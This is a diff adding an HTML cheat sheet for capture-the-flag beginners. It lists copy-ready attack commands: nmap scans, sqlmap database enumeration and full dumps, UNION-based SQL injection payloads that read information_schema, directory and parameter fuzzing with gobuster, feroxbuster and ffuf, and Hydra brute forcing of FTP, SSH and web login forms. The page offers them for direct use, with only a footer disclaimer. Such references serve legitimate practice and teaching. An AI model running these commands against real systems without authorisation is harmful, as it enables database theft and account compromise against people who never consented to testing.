@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Cheatsheet For Noob</title>
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+    <link rel="stylesheet" href="assets/customlay.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+</head>
+
+<body onload="themeOnLoad()">
+    <container class="container">
+        <div id="app">
+            <!--Mobile Nav Bar-->
+            <div id="navmobile"></div>
+            <!--Back to Top button-->
+            <button onclick="topFunction()" id="topBtn" title="Go to top"><i class="fa fa-angle-double-up"
+                    aria-hidden="true"></i></button>
+            <!-- Content section-->
+            <section class="main-content columns is-fullheight">
+                <!-- Computer Sidebar-->
+                <div id="navdesktop"></div>
+                <!--Content-->
+                <div class="container is-fluid">
+
+                    <h1 class="has-text-centered is-size-3" style="padding-top: 50px; padding-bottom: 10px;">
+                        Reconnaissance</h1>
+                    <h2 class="has-text-centered is-size-5" style="padding-bottom:30px">Everything start with
+                        researching, then process a bit further</h2>
+                    <!-- Page Menu -->
+                    <div class="has-text-centered">
+                    <a href="#h1" class="button is-link is-small is-light is-rounded">NMap</a>
+                    <a href="#h3" class="button is-warning is-small is-light is-rounded">SQLMap</a>
+                    <a href="#h5" class="button is-success is-small is-light is-rounded">SQL with Burp</a>
+                    <a href="#h9" class="button is-info is-small is-light is-rounded">Gobuster</a>
+                    <a href="#h10" class="button is-warning is-small is-light is-rounded">Feroxbuster</a>
+                    <a href="#h11" class="button is-danger is-small is-light is-rounded">Ffuf</a>
+                    <a href="#h16" class="button is-info is-small is-light is-rounded">Hydra</a>
+                    </div>
+
+                    <br><br>
+                    <!--Command board-->
+                    <article class="message is-link">
+                        <div class="message-header" id="h1">
+                            <p>Enumerating ports with NMap</p>
+                            <button class="button" data-clipboard-target="#c1">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c1">
+                            nmap -A -sV -p- {IP} -vv
+                        </div>
+                        <div class="message-header" id="h2">
+                            <p>SQLi scanning with NMap</p>
+                            <button class="button" data-clipboard-target="#c2">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c2">
+                            nmap -sV --script=http-sql-injection {IP or domain name} –p {80/443}
+                        </div>
+                    </article>
+
+                    <article class="message is-warning">
+                        <div class="message-header" id="h3">
+                            <p>SQLMap DB Enum</p>
+                            <button class="button" data-clipboard-target="#c3">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c3">
+                            sqlmap -u "{SQLi query link}" --dbs --batch
+                        </div>
+                        <div class="message-header" id="h4">
+                            <p>SQLMap DB Dump</p>
+                            <button class="button" data-clipboard-target="#c4">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c4">
+                            sqlmap -u "{SQLi query link}" -D {DB name} --dump-all
+                        </div>
+                    </article>
+
+                    <article class="message is-success">
+                        <div class="message-header" id="h5">
+                            <p>SQL schema Query used in Burp repeater</p>
+                            <button class="button" data-clipboard-target="#c5">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c5">
+                            /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns
+                            WHERE table_name="{table name}"
+                        </div>
+                        <div class="message-header" id="h6">
+                            <p>Amalgamate SQL column names into single output</p>
+                            <button class="button" data-clipboard-target="#c6">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c6">
+                            /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM
+                            information_schema.columns WHERE table_name="{table name}"
+                        </div>
+                        <div class="message-header" id="h7">
+                            <p>Craft a query</p>
+                            <button class="button" data-clipboard-target="#c7">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c7">
+                            0 UNION ALL SELECT notes,null,null,null,null FROM {table name} WHERE id = {primary key}
+                        </div>
+                    </article>
+
+                    <article class="message is-info">
+                        <div class="message-header" id="h9">
+                            <p>Gobuster Directory/Sub Domain/VHOST Scanning</p>
+                            <button class="button" data-clipboard-target="#c9">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c9">
+                            gobuster {dir/dns/vhost} -u {target ip} -w {wordlist} -v
+                        </div>
+                    </article>
+
+                    <article class="message is-warning">
+                        <div class="message-header" id="h10">
+                            <p>Feroxbuster Web Directory rush Scanning</p>
+                            <button class="button" data-clipboard-target="#c10">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c10">
+                            ./feroxbuster -u {target} --depth {optional} --wordlist {wordlist} -x {file extension} -H
+                            {Include Header} -vv
+                        </div>
+                    </article>
+
+                    <article class="message is-danger">
+                        <div class="message-header" id="h11">
+                            <p>Ffuf fuzzing typical directory discovery</p>
+                            <button class="button" data-clipboard-target="#c11">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c11">
+                            ffuf -w {wordlist} -u https://target/FUZZ
+                        </div>
+                        <div class="message-header" id="h12">
+                            <p>Ffuf fuzzing vhost discovery</p>
+                            <button class="button" data-clipboard-target="#c12">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c12">
+                            ffuf -w {wordlist} -u https://target -H "Host: FUZZ" -fs {vhost response size}
+                        </div>
+                        <div class="message-header" id="h13">
+                            <p>Ffuf unknown GET parameter fuzzing</p>
+                            <button class="button" data-clipboard-target="#c13">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c13">
+                            ffuf -w {wordlist} -u https://target/script.php?FUZZ=test_value -fs {vhost response size}
+                        </div>
+                        <div class="message-header" id="h14">
+                            <p>Ffuf Known GET parameter fuzzing</p>
+                            <button class="button" data-clipboard-target="#c14">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c14">
+                            ffuf -w {wordlist} -u https://target/script.php?valid_name=FUZZ -fc 401
+                        </div>
+                        <div class="message-header" id="h15">
+                            <p>Ffuf POST data fuzzing</p>
+                            <button class="button" data-clipboard-target="#c15">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c15">
+                            ffuf -w {wordlist} -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php
+                            -fc 401
+                        </div>
+                    </article>
+
+                    <article class="message is-info">
+                        <div class="message-header" id="h16">
+                            <p>Hydra FTP Brute forcing</p>
+                            <button class="button" data-clipboard-target="#c16">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c16">
+                            hydra -l user -P passlist.txt ftp://MACHINE_IP
+                        </div>
+                        <div class="message-header" id="h17">
+                            <p>Hydra SSH Brute forcing</p>
+                            <button class="button" data-clipboard-target="#c17">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c17">
+                            hydra -l {username} -P {full path to pass} MACHINE_IP -t 4 ssh
+                        </div>
+                        <div class="message-header" id="h18">
+                            <p>Hydra Post Web Form Scanning</p>
+                            <button class="button" data-clipboard-target="#c18">
+                                <i class="fa-solid fa-clipboard fa-beat-fade" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c18">
+                            hydra -l {username} -P {wordlist} MACHINE_IP http-post-form
+                            "/:username=^USER^&password=^PASS^:F=incorrect" -V
+                        </div>
+                    </article>
+
+                    <br><br><br><br>
+                    <!--End of Command board-->
+                </div>
+                <!--End of Home-->
+            </section>
+        </div>
+        <footer class="footer is-size-7">
+            <div class="content has-text-centered has-text-info">
+                <p>
+                    Content in this website are used in education purpose only, please do not use it in
+                    illegal
+                    way.<br>
+                    We have no responsibility for your use of this website and it's content.<br><br>
+                    This website is best view with 1280x720 or above.
+                </p>
+            </div>
+        </footer>
+    </container>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+<script src="https://kit.fontawesome.com/96d3b659ea.js" crossorigin="anonymous"></script>
+<script src="assets/customscript.js"></script>
+
+
+</html>
